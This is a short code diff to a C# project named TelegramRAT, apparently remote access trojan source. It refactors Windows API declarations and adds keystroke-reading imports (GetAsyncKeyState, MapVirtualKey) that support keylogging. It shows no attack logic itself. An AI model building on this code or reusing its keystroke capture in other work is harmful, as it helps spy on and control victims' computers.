@@ -7,7 +7,7 @@ using System.Drawing;
 
 namespace TelegramRAT
 {
-    static class NativeFunctionsWrapper
+    static class WinAPI
     {
         const string u32 = "user32.dll";
 
@@ -78,7 +78,7 @@ namespace TelegramRAT
         [DllImport(u32, EntryPoint = "GetForegroundWindow")]
         public static extern IntPtr GetForegroundWindow();
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        [DllImport(u32, CharSet = CharSet.Auto)]
         public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 
         public const int SPI_SETDESKWALLPAPER = 20;
@@ -89,12 +89,14 @@ namespace TelegramRAT
         [DllImport(u32, EntryPoint = "CloseWindow")]
         public static extern bool MinimizeWindow(IntPtr handle);
 
-        [DllImport("user32.dll", SetLastError = true)]
+        [DllImport(u32, SetLastError = true)]
         public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int processId);
 
         [DllImport(u32, EntryPoint = "GetAsyncKeyState")]
-        public static extern short GetAsyncKeyState(int key);
+        public static extern short GetAsyncKeyState(uint key);
 
+        [DllImport(u32, EntryPoint = "MapVirtualKeyA")]
+        public static extern char MapVirtualKey(uint keyCode, uint mapType = 2);
         
 
     }
